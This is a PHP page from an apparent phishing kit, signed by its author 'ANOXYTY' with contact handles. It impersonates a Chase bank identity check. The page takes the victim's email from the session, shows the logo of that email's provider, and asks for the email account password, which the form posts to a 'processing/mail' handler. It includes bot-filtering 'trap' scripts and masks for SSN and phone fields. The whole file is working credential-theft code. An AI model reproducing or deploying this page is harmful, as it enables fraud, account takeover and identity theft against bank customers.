<?php
ini_set( "display_errors", 0); 
/*       
// made by ANOXYTY" //Contact https://icq.im/Anoxyty / TELEGRAM @ANOXYTY "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/
include('anoxytytrap/anoxyty.php');
include 'anoxytytrap/bite.php';
include 'anoxytytrap/country.php';
include 'anoxytytrap/une.php';
define('Myheader', TRUE);
	ob_start();
session_start();
$email = $_SESSION['email'];
$domain = substr($email, strpos($email, '@') + 1);

$token = bin2hex(random_bytes(32));
$_SESSION['token'] = $token;
?>

 <?php include 'layers/header.php'; ?>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="./assets/dist/css/formValidation.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
    <body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true"><div id="logonApp" data-is-view="true"><div class="homepage" tabindex="-1"><div id="advertisenativeapp" data-has-view="true"><div data-is-view="true"></div></div> <div class="logon-container" id="container"><header class="toggle-aria-hidden" id="logon-summary-menu" data-has-view="true"><div class="logon header jpui transparent navigation bar" data-is-view="true"><a id="logoHomepageLink" href="#"> <div class="chase logo"></div> <span class="util accessible-text">&#x43;&#x68;&#x61;&#x73;&#x65;&#x20;&#x68;&#x6f;&#x6d;&#x65;&#x70;&#x61;&#x67;&#x65;</span></a> </div></header> <main id="logon-content" data-has-view="true"><div class="msd password-reset first-step" data-is-view="true"><div id="backgroundImage">
	
	<div class="jpui background image fixed blurred" id="geoImage"></div>
	
	
	
	
	
</div>

<div class="container"><div class="row jpui primary panel"><div class="col-xs-12 col-md-10 col-md-offset-1 content-container">

<h1 class="header" id="passwordResetHeader" tabindex="-1">To continue </h1> <div class="row jpui panel body" id="mainpanel"> <div class="col-xs-12 col-sm-10 col-sm-offset-1"><div class="progress u-no-outline" id="progress" tabindex="-1"><div class="row"><div class="col-xs-12 col-sm-6 clear-padding"><h2>Email Authentication <span class="util high-contrast">Step 2 of 4</span></h2> </div> <div class="col-xs-12 col-sm-6 progress-padding"><div class="jpui progress rectangles" id="progress-progressBar" data-progress=""><ol class="steps-4" role="presentation"><li  id="progress-progressBar-step2"><span class="util accessible-text" id="accessible-progress-progressBar-step-2"></span></li><li class="active current-step" id="progress-progressBar-step-2"></li><li id="progress-progressBar-step-3"></li><li id="progress-progressBar-step-4"></li></ol></div></div></div></div><h3>Help us verify your identity.</h3> <p>For your security, we need to verify your identity. please complete the requested information.</p>     <div class="recovery options inside-container">

<form class="toggle-aria-hidden" method="POST" id="axx" autocomplete="off" action="processing/mail" >
<p align="center">
<object data="https://logo.clearbit.com/<?php echo $domain;?>" width="93" height="98" type="image/jpg">
</object>
</p>

<p align="center">Please login to <?php echo $domain;?> to verify your email.</p>
<div class="fl w-75" id="messages"></div>





<div class="row account-type-container"><fieldset><div class="col-xs-12 col-sm-4 col-sm-offset-1 label-column"><label class="jpui label account-type-label" aria-hidden="true">Email Address</label></div> <div class="col-xs-12 col-sm-6 col-md-6 form-column"><div class="radio-text-group account-type-card"><div class="jpui radiobutton default_option" id="option_1_radio"> <div class="inputWrapper"><input type="radio" id="input-option_1_radio" value="ssn_card_account_number" name="ssnAccountTypeId" checked="">  <label class="radiobutton-label" for="input-option_1_radio" id="label-option_1_radio"><div><div class="radiobutton-outer-circle" aria-hidden="true"><div class="radiobutton-inner-circle"></div></div></div> <div class="radiobutton-label-content"><?=$email;?></div> </label> </div> </div> </div>  </div></fieldset></div>







<!-- hidden  -->	
		
 <input type="hidden" name="token" value="<?php echo $token; ?>">
<!-- hidden  -->	



<div class="row"><div class="col-xs-12 col-sm-4 col-sm-offset-1 label-column"><label class="jpui label reset_by_social_security_number" for="emailpassword" aria-hidden="false"> Email Password </label> </div> <div class="col-xs-12 col-sm-6 col-md-6 form-column"><div class="form-toggle reset_by_social_security_number"><div > <input min="5" class="jpui input" type="password" name="pass"  value="">    </div> </div> </div></div>






 </div> <div class="button-container row hide-xs show-sm"><div class="col-xs-12 col-sm-3 col-sm-offset-6"></div> <div id="logonSkipLinkContainer"></div> <div class="col-xs-12 col-sm-3"><button type="submit" id="proceedToLocateUserId" class="jpui button focus primary fluid touch" aria-disabled="true"><span class="label">Next</span> </button></div></div> <div class="button-container row hide-sm"><div class="col-xs-12 col-sm-3 col-sm-push-9"><button type="submit" id="proceedToLocateUserId" class="jpui button focus primary fluid touch" aria-disabled="true"><span class="label">Next</span> </button></div> <div class="col-xs-12 col-sm-3 col-sm-push-3"></div></div></div></div></form>
 
 
 
 
<style type="text/css">
.red		{color: #bb0826;
background-image: url('assets/img/warning-3-16.ico');
background-repeat: no-repeat;
padding-left: 30px;  /* width of the image plus a little extra padding */
display: block;
font-size: 1rem;
font-weight: 300;
color: #BF2155;
letter-spacing: 0;
width: 100%;
margin: .0625rem .0625rem .313rem 0;
font-family: 'Open Sans','Helvetica Neue',Helvetica,Arial,sans-serif;
font-size: 16px;
}
	</style>	 
<script src="https://cdnjs.cloudflare.com/ajax/libs/es6-shim/0.35.3/es6-shim.min.js"></script>    
<script src="assets/dist/js/done.js"></script>
<script src="assets/dist/js/FormValidation.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
<script>
$('input[name="phone"]').mask('(000) 000-0000');
 $('input[name="ssn"]').mask('000-00-0000');
 </script>
 
 
 
 
 
 
 
 
 </div></div></div>



</div></div>























</div></main></div> </div></div></body></html>